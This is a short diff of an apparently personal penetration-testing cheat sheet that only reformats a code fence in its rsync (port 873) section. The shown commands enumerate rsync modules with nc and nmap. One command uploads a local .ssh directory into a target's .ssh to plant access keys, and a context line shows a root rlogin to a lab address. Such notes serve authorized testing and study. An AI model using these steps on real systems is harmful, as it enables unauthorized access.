@@ -617,14 +617,14 @@ rlogin -l root 10.11.1.111
 ## Port 873 - Rsync
 https://book.hacktricks.xyz/pentesting/873-pentesting-rsync
 
-'''
+```
 nc -vn 192.168.152.126 873
 
 nmap -sV --script "rsync-list-modules" -p 873  192.168.152.126 --List Shares
 
 rsync -av /home/kali/.ssh rsync://fox@192.168.152.126/fox/.ssh
+```
 
-'''
 
 ## Port 1030/1032/1033/1038
 
